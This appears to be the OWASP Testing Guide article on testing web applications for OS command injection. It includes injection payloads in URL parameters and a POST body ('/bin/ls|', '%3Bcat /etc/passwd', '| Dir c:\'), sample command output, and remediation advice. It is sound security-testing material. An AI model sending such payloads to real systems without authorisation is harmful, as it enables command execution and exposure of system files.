# Testing for Command Injection (OTG-INPVAL-013)


## Summary
This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.


OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands.  Any web interface that is not properly sanitized is subject to this exploit.  With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords.  OS command injection is preventable when security is emphasized during the design and development of applications.


## How to Test
When viewing a file in a web application, the file name is often shown in the URL.  Perl allows piping data from a process into an open statement.  The user can simply append the Pipe symbol “|” onto the end of the file name.


Example URL before alteration:<br>
```
 http://sensitive/cgi-bin/userData.pl?doc=user1.txt<br>
```

Example URL modified:<br>
```
 http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|<br>
```

This will execute the command “/bin/ls”.<br>


Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is url encoded and decodes to semicolon
<br>

Example:<br>
```
 http://sensitive/something.php?dir=%3Bcat%20/etc/passwd<br>
```

**Example**<br>
Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up WebScarab, you can obtain a POST HTTP like the following:

```
POST http://www.example.com/public/doc HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```


In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following:

```
POST http://www.example.com/public/doc HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```


If the application doesn't validate the request, we can obtain the following result:
```
Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
Output...
Il volume nell'unità C non ha etichetta.
Numero di serie Del volume: 8E3F-4B61
Directory of c:\
 18/10/2006 00:27 2,675 Dir_Prog.txt
 18/10/2006 00:28 3,887 Dir_ProgFile.txt
 16/11/2006 10:43
    Doc
    11/11/2006 17:25
       Documents and Settings
       25/10/2006 03:11
          I386
          14/11/2006 18:51
	     h4ck3r
	     30/09/2005 21:40 25,934
		OWASP1.JPG
		03/11/2006 18:29
			Prog
			18/11/2006 11:20
				Program Files
				16/11/2006 21:12
					Software
					24/10/2006 18:25
						Setup
						24/10/2006 23:37
							Technologies
							18/11/2006 11:14
							3 File 32,496 byte
							13 Directory 6,921,269,248 byte disponibili
							Return code: 0
```


In this case, we have successfully performed an OS injection attack.


##Tools

* OWASP [WebScarab](https://www.owasp.org/index.php/OWASP_WebScarab_Project)<br>
* OWASP [WebGoat](https://www.owasp.org/index.php/OWASP_WebGoat_Project)

## References

**White papers**<br>
* http://www.securityfocus.com/infocus/1709<br>

## Remediation
###Sanitization
The URL and form data needs to be sanitized for invalid characters.  A “blacklist” of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet.  A “white list” containing only allowable characters should be created to validate the user input.  Characters that were missed, as well as undiscovered threats, should be eliminated by this list.<br>

###Permissions
The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all these informations to test from a Gray Box point of view<br>
